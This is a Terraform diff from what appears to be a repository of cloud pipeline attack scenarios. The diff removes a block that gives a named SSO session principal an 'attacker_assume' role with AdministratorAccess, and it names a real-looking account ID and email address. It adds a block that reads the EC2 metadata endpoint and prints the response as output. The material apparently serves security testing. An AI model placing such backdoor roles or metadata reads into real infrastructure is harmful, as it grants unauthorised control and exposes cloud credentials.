@@ -395,28 +395,13 @@ data "aws_iam_policy_document" "access_logs" {
 }
 
 
-# Scenario 3 - Provide administrator access to specific assumed-role session principal
+# Scenario 3 - Interact with metadata endpoint
 
-# 1. Create "attacker_assume" role, allowing session principal to assume the role
-resource "aws_iam_role" "attacker_assume" {
-  name = "attacker_assume"
-  assume_role_policy = jsonencode(
-    {
-      Version = "2012-10-17",
-      Statement = [
-        {
-          Effect    = "Allow",
-          Action    = "sts:AssumeRole",
-          Principal = { "AWS" : "arn:aws:sts::620540024451:assumed-role/AWSReservedSSO_DeliveryPipelinesReadOnly_f04864ddda3ca08e/twedgbury@nettitude.com" }
-      }]
-    }
-  )
+data "http" "metadata" {
+  url = "http://169.254.169.254/latest/meta-data/"
 }
 
-# 2. Attach "AdministratorAccess" policy to "attacker_assume" role
-resource "aws_iam_policy_attachment" "attacker_administrator" {
-  name       = "AdministratorAccess policy to attacker_assume role"
-  roles      = ["${aws_iam_role.attacker_assume.name}"]
-  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
+output "metadata_output" {
+  value = data.http.metadata.body
 }
 
